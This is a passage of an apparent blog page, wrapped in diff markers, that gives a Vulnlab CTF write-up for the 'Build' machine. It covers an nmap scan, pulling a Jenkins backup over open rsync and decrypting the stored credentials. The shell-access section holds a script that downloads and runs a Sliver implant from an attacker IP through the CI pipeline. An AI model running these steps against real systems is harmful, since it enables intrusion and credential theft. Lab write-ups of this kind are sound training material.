+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>About</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>Dark Mode</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">Table of contents</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#enumeration">Enumeration</a>
+      <ol>
+        <li><a href="#nmap-scan">Nmap scan</a></li>
+      </ol>
+    </li>
+    <li><a href="#http---3000">HTTP - 3000</a>
+      <ol>
+        <li><a href="#gitea">Gitea</a></li>
+      </ol>
+    </li>
+    <li><a href="#rsync">Rsync</a></li>
+    <li><a href="#backup">Backup</a>
+      <ol>
+        <li><a href="#jenkins-credentials-decryptor">jenkins-credentials-decryptor</a></li>
+      </ol>
+    </li>
+    <li><a href="#shell-access">Shell access</a>
+      <ol>
+        <li><a href="#sliver">Sliver</a></li>
+        <li><a href="#implant-upload">Implant Upload</a></li>
+      </ol>
+    </li>
+    <li><a href="#mysql-server">MySQL server</a>
+      <ol>
+        <li><a href="#sliver-socks5">Sliver socks5</a></li>
+        <li><a href="#powerdns">PowerDNS</a></li>
+        <li><a href="#hashcat">hashcat</a></li>
+      </ol>
+    </li>
+    <li><a href="#privilege-escalation">Privilege escalation</a>
+      <ol>
+        <li><a href="#powerdns-1">PowerDNS</a></li>
+        <li><a href="#rsh">rsh</a></li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/vulnlab/" >
+                Vulnlab
+            </a>
+        
+            <a href="/categories/ctf/" >
+                Ctf
+            </a>
+        
+            <a href="/categories/misconfigurations/" >
+                Misconfigurations
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/vulnlab-build-writeup/">Vulnlab :: Build Writeup</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Jan 04, 2025</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    4 minute read
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <p><img src="/p/vulnlab-build-writeup/build.png"
+	width="534"
+	height="616"
+	srcset="/p/vulnlab-build-writeup/build_hu2805579988426742214.png 480w, /p/vulnlab-build-writeup/build_hu7150155912625266336.png 1024w"
+	loading="lazy"
+	
+		alt="pwned"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="86"
+		data-flex-basis="208px"
+	
+></p>
+<h2 id="enumeration">Enumeration
+</h2><h3 id="nmap-scan">Nmap scan
+</h3><p>I start with a standard scan using nmap</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span><span class="lnt">78
+</span><span class="lnt">79
+</span><span class="lnt">80
+</span><span class="lnt">81
+</span><span class="lnt">82
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">exegol-VulnLab /workspace # nmap -sCV --min-rate 5000 -p- 10.10.104.46
+</span></span><span class="line"><span class="cl">Starting Nmap 7.93 ( https://nmap.org ) at 2024-12-31 19:53 CET
+</span></span><span class="line"><span class="cl">Nmap scan report for 10.10.104.46
+</span></span><span class="line"><span class="cl">Host is up (0.033s latency).
+</span></span><span class="line"><span class="cl">Not shown: 65526 closed tcp ports (reset)
+</span></span><span class="line"><span class="cl">PORT     STATE    SERVICE         VERSION
+</span></span><span class="line"><span class="cl">22/tcp   open     ssh             OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
+</span></span><span class="line"><span class="cl">| ssh-hostkey:
+</span></span><span class="line"><span class="cl">|   256 472173e26b96cdf91311af40c84dd67f (ECDSA)
+</span></span><span class="line"><span class="cl">|_  256 2b5ebaf372d3b309df25412909f47bf5 (ED25519)
+</span></span><span class="line"><span class="cl">53/tcp   open     domain          PowerDNS
+</span></span><span class="line"><span class="cl">| dns-nsid:
+</span></span><span class="line"><span class="cl">|   NSID: pdns (70646e73)
+</span></span><span class="line"><span class="cl">|_  id.server: pdns
+</span></span><span class="line"><span class="cl">512/tcp  open     exec            netkit-rsh rexecd
+</span></span><span class="line"><span class="cl">513/tcp  open     login?
+</span></span><span class="line"><span class="cl">514/tcp  open     shell           Netkit rshd
+</span></span><span class="line"><span class="cl">873/tcp  open     rsync           (protocol version 31)
+</span></span><span class="line"><span class="cl">3000/tcp open     ppp?
+</span></span><span class="line"><span class="cl">| fingerprint-strings:
+</span></span><span class="line"><span class="cl">|   GenericLines, Help, RTSPRequest:
+</span></span><span class="line"><span class="cl">|     HTTP/1.1 400 Bad Request
+</span></span><span class="line"><span class="cl">|     Content-Type: text/plain; charset=utf-8
+</span></span><span class="line"><span class="cl">|     Connection: close
+</span></span><span class="line"><span class="cl">|     Request
+</span></span><span class="line"><span class="cl">|   GetRequest:
+</span></span><span class="line"><span class="cl">|     HTTP/1.0 200 OK
+</span></span><span class="line"><span class="cl">|     Cache-Control: max-age=0, private, must-revalidate, no-transform
+</span></span><span class="line"><span class="cl">|     Content-Type: text/html; charset=utf-8
+</span></span><span class="line"><span class="cl">|     Set-Cookie: i_like_gitea=d2c9c1889c1be19e; Path=/; HttpOnly; SameSite=Lax
+</span></span><span class="line"><span class="cl">|     Set-Cookie: _csrf=wDA7qaMkEld7Qac9d679W84mZGc6MTczNTY3MTE5ODcxNDk2MjUwOQ; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
+</span></span><span class="line"><span class="cl">|     X-Frame-Options: SAMEORIGIN
+</span></span><span class="line"><span class="cl">|     Date: Tue, 31 Dec 2024 18:53:18 GMT
+</span></span><span class="line"><span class="cl">|     &lt;!DOCTYPE html&gt;
+</span></span><span class="line"><span class="cl">|     &lt;html lang=&#34;en-US&#34; class=&#34;theme-auto&#34;&gt;
+</span></span><span class="line"><span class="cl">|     &lt;head&gt;
+</span></span><span class="line"><span class="cl">|     &lt;meta name=&#34;viewport&#34; content=&#34;width=device-width, initial-scale=1&#34;&gt;
+</span></span><span class="line"><span class="cl">|     &lt;title&gt;Gitea: Git with a cup of tea&lt;/title&gt;
+</span></span><span class="line"><span class="cl">|     &lt;link rel=&#34;manifest&#34; href=&#34;data:application/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlYSIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRfdXJsIjoiaHR0cDovL2J1aWxkLnZsOjMwMDAvIiwiaWNvbnMiOlt7InNyYyI6Imh0dHA6Ly9idWlsZC52bDozMDAwL2Fzc2V0cy9pbWcvbG9nby5wbmciLCJ0eXBlIjoiaW1hZ2UvcG5nIiwic2l6ZXMiOiI1MTJ
+</span></span><span class="line"><span class="cl">|   HTTPOptions:
+</span></span><span class="line"><span class="cl">|     HTTP/1.0 405 Method Not Allowed
+</span></span><span class="line"><span class="cl">|     Allow: HEAD
+</span></span><span class="line"><span class="cl">|     Allow: GET
+</span></span><span class="line"><span class="cl">|     Cache-Control: max-age=0, private, must-revalidate, no-transform
+</span></span><span class="line"><span class="cl">|     Set-Cookie: i_like_gitea=3f4d6c58c593d79c; Path=/; HttpOnly; SameSite=Lax
+</span></span><span class="line"><span class="cl">|     Set-Cookie: _csrf=ctOOokawoDQpWUCFgg2IYwPMi4s6MTczNTY3MTIwMzkwNTcxMjYzNw; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
+</span></span><span class="line"><span class="cl">|     X-Frame-Options: SAMEORIGIN
+</span></span><span class="line"><span class="cl">|     Date: Tue, 31 Dec 2024 18:53:23 GMT
+</span></span><span class="line"><span class="cl">|_    Content-Length: 0
+</span></span><span class="line"><span class="cl">3306/tcp filtered mysql
+</span></span><span class="line"><span class="cl">8081/tcp filtered blackice-icecap
+</span></span><span class="line"><span class="cl">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+</span></span><span class="line"><span class="cl">SF-Port3000-TCP:V=7.93%I=7%D=12/31%Time=67743D9F%P=x86_64-pc-linux-gnu%r(G
+</span></span><span class="line"><span class="cl">SF:enericLines,67,&#34;HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20
+</span></span><span class="line"><span class="cl">SF:text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\
+</span></span><span class="line"><span class="cl">SF:x20Request&#34;)%r(GetRequest,2990,&#34;HTTP/1\.0\x20200\x20OK\r\nCache-Control
+</span></span><span class="line"><span class="cl">SF::\x20max-age=0,\x20private,\x20must-revalidate,\x20no-transform\r\nCont
+</span></span><span class="line"><span class="cl">SF:ent-Type:\x20text/html;\x20charset=utf-8\r\nSet-Cookie:\x20i_like_gitea
+</span></span><span class="line"><span class="cl">SF:=d2c9c1889c1be19e;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nSet-Cooki
+</span></span><span class="line"><span class="cl">SF:e:\x20_csrf=wDA7qaMkEld7Qac9d679W84mZGc6MTczNTY3MTE5ODcxNDk2MjUwOQ;\x20
+</span></span><span class="line"><span class="cl">SF:Path=/;\x20Max-Age=86400;\x20HttpOnly;\x20SameSite=Lax\r\nX-Frame-Optio
+</span></span><span class="line"><span class="cl">SF:ns:\x20SAMEORIGIN\r\nDate:\x20Tue,\x2031\x20Dec\x202024\x2018:53:18\x20
+</span></span><span class="line"><span class="cl">SF:GMT\r\n\r\n&lt;!DOCTYPE\x20html&gt;\n&lt;html\x20lang=\&#34;en-US\&#34;\x20class=\&#34;theme
+</span></span><span class="line"><span class="cl">SF:-auto\&#34;&gt;\n&lt;head&gt;\n\t&lt;meta\x20name=\&#34;viewport\&#34;\x20content=\&#34;width=devic
+</span></span><span class="line"><span class="cl">SF:e-width,\x20initial-scale=1\&#34;&gt;\n\t&lt;title&gt;Gitea:\x20Git\x20with\x20a\x20
+</span></span><span class="line"><span class="cl">SF:cup\x20of\x20tea&lt;/title&gt;\n\t&lt;link\x20rel=\&#34;manifest\&#34;\x20href=\&#34;data:ap
+</span></span><span class="line"><span class="cl">SF:plication/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlY
+</span></span><span class="line"><span class="cl">SF:SIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRf
+</span></span><span class="line"><span class="cl">SF:dXJsIjoiaHR0cDovL2J1aWxkLnZsOjMwMDAvIiwiaWNvbnMiOlt7InNyYyI6Imh0dHA6Ly9
+</span></span><span class="line"><span class="cl">SF:idWlsZC52bDozMDAwL2Fzc2V0cy9pbWcvbG9nby5wbmciLCJ0eXBlIjoiaW1hZ2UvcG5nIi
+</span></span><span class="line"><span class="cl">SF:wic2l6ZXMiOiI1MTJ&#34;)%r(Help,67,&#34;HTTP/1\.1\x20400\x20Bad\x20Request\r\nCo
+</span></span><span class="line"><span class="cl">SF:ntent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n
+</span></span><span class="line"><span class="cl">SF:\r\n400\x20Bad\x20Request&#34;)%r(HTTPOptions,197,&#34;HTTP/1\.0\x20405\x20Meth
+</span></span><span class="line"><span class="cl">SF:od\x20Not\x20Allowed\r\nAllow:\x20HEAD\r\nAllow:\x20GET\r\nCache-Contro
+</span></span><span class="line"><span class="cl">SF:l:\x20max-age=0,\x20private,\x20must-revalidate,\x20no-transform\r\nSet
+</span></span><span class="line"><span class="cl">SF:-Cookie:\x20i_like_gitea=3f4d6c58c593d79c;\x20Path=/;\x20HttpOnly;\x20S
+</span></span><span class="line"><span class="cl">SF:ameSite=Lax\r\nSet-Cookie:\x20_csrf=ctOOokawoDQpWUCFgg2IYwPMi4s6MTczNTY
+</span></span><span class="line"><span class="cl">SF:3MTIwMzkwNTcxMjYzNw;\x20Path=/;\x20Max-Age=86400;\x20HttpOnly;\x20SameS
+</span></span><span class="line"><span class="cl">SF:ite=Lax\r\nX-Frame-Options:\x20SAMEORIGIN\r\nDate:\x20Tue,\x2031\x20Dec
+</span></span><span class="line"><span class="cl">SF:\x202024\x2018:53:23\x20GMT\r\nContent-Length:\x200\r\n\r\n&#34;)%r(RTSPReq
+</span></span><span class="line"><span class="cl">SF:uest,67,&#34;HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/pl
+</span></span><span class="line"><span class="cl">SF:ain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Requ
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="http---3000">HTTP - 3000
+</h2><p>On port 3000, there is Gitea, which contains 1 public repository</p>
+<h3 id="gitea">Gitea
+</h3><p><img src="/p/vulnlab-build-writeup/gitea1.png"
+	width="928"
+	height="489"
+	srcset="/p/vulnlab-build-writeup/gitea1_hu444918956303822147.png 480w, /p/vulnlab-build-writeup/gitea1_hu2311464567782863095.png 1024w"
+	loading="lazy"
+	
+		alt="gitea1"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="189"
+		data-flex-basis="455px"
+	
+></p>
+<p><img src="/p/vulnlab-build-writeup/gitea2.png"
+	width="927"
+	height="908"
+	srcset="/p/vulnlab-build-writeup/gitea2_hu16737276991840040491.png 480w, /p/vulnlab-build-writeup/gitea2_hu7281691764156298241.png 1024w"
+	loading="lazy"
+	
+		alt="gitea2"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="102"
+		data-flex-basis="245px"
+	
+></p>
+<p>In the public repository, there is a jenkins pipeline</p>
+<h2 id="rsync">Rsync
+</h2><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">rsync -av --list-only rsync://10.10.104.46
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">rsync -av --list-only rsync://10.10.104.46/backups/
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/vulnlab-build-writeup/rsync-jenkins.png"
+	width="1379"
+	height="172"
+	srcset="/p/vulnlab-build-writeup/rsync-jenkins_hu11376010596771889083.png 480w, /p/vulnlab-build-writeup/rsync-jenkins_hu5414215222314196896.png 1024w"
+	loading="lazy"
+	
+		alt="rsync"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="801"
+		data-flex-basis="1924px"
+	
+></p>
+<p>The machine also has an exposed rsync, which contains a jenkins backup</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">rsync -av rsync://10.10.104.46/backups ./sdf
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="backup">Backup
+</h2><h3 id="jenkins-credentials-decryptor">jenkins-credentials-decryptor
+</h3><p><a class="link" href="https://github.com/hoto/jenkins-credentials-decryptor"  target="_blank" rel="noopener"
+    ><img src="/p/vulnlab-build-writeup/jcd.png"
+	width="399"
+	height="199"
+	srcset="/p/vulnlab-build-writeup/jcd_hu3566221931337203886.png 480w, /p/vulnlab-build-writeup/jcd_hu15695948937403945122.png 1024w"
+	loading="lazy"
+	
+		alt="jenkins-creds-decryptor"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="200"
+		data-flex-basis="481px"
+	
+></a></p>
+<p><a class="link" href="https://github.com/hoto/jenkins-credentials-decryptor"  target="_blank" rel="noopener"
+    >https://github.com/hoto/jenkins-credentials-decryptor</a></p>
+<p>Having access to the Jenkins backup using the <code>jenkins-credentials-decryptor tool</code>, I was able to decrypt the password for the user <code>buildadm</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">nix profile install github:hoto/jenkins-credentials-decryptor
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">jenkins-credentials-decryptor <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>       -m ./secrets/master.key <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>       -s ./secrets/hudson.util.Secret <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>       -c ./jobs/build/config.xml <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>       -o json
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/vulnlab-build-writeup/jdecrypt.png"
+	width="809"
+	height="356"
+	srcset="/p/vulnlab-build-writeup/jdecrypt_hu1011192231975284202.png 480w, /p/vulnlab-build-writeup/jdecrypt_hu6710681346916546811.png 1024w"
+	loading="lazy"
+	
+		alt="backup-dcrypt"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="227"
+		data-flex-basis="545px"
+	
+></p>
+<p>I can currently log in to Gitea</p>
+<h2 id="shell-access">Shell access
+</h2><p>Next, I decided to upload the sliver implant to the machine through the pipeline</p>
+<h3 id="sliver">Sliver
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sliver &gt; generate --mtls 10.8.4.230:8888 --os Linux --arch 64
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sliver &gt; mtls --lport 8888
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="implant-upload">Implant Upload
+</h3><p><code>sh.sh</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="cp">#!/bin/env bash
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl">curl http://10.8.4.230/LAZY_POLO -o /tmp/LAZY_POLO <span class="o">&amp;&amp;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>    chmod +x /tmp/LAZY_POLO <span class="o">&amp;&amp;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>    /tmp/LAZY_POLO
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>http server</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">python3 -m http.server
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/vulnlab-build-writeup/gitea-curl.png"
+	width="1317"
+	height="473"
+	srcset="/p/vulnlab-build-writeup/gitea-curl_hu15619068497117943931.png 480w, /p/vulnlab-build-writeup/gitea-curl_hu18407509548890239633.png 1024w"
+	loading="lazy"
+	
+		alt="bulidadm/dev"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="278"
+		data-flex-basis="668px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sliver &gt; use fff759cb-5de0-49bd-990b-aec6b0a1db35
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sliver (LAZY_POLO) &gt; shell
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>I managed to gain access to the shell and get the contents of the first flag</p>
+<p><img src="/p/vulnlab-build-writeup/shell1.png"
+	width="658"
+	height="38"
+	srcset="/p/vulnlab-build-writeup/shell1_hu10312844420210005380.png 480w, /p/vulnlab-build-writeup/shell1_hu11563642882352075684.png 1024w"
+	loading="lazy"
+	
+		alt="shell"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="1731"
+		data-flex-basis="4155px"
+	
+></p>
+<p><img src="/p/vulnlab-build-writeup/shell2.png"
+	width="276"
+	height="49"
+	srcset="/p/vulnlab-build-writeup/shell2_hu8615907542853875672.png 480w, /p/vulnlab-build-writeup/shell2_hu8965801178688293071.png 1024w"
+	loading="lazy"
+	
+		alt="shell"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="563"
+		data-flex-basis="1351px"
+	
+></p>
+<p>Everything indicates that we are inside the container :/</p>
+<h2 id="mysql-server">MySQL server
+</h2><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">3306/tcp filtered mysql
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Using a proxy, we are able to log in to the MySQL server as root</p>
+<h3 id="sliver-socks5">Sliver socks5
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sliver (LAZY_POLO) &gt; socks5 start
+</span></span></code></pre></td></tr></table>
+</div>
+</div><blockquote>
+<p>remember to properly configure proxychains!</p>
+</blockquote>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
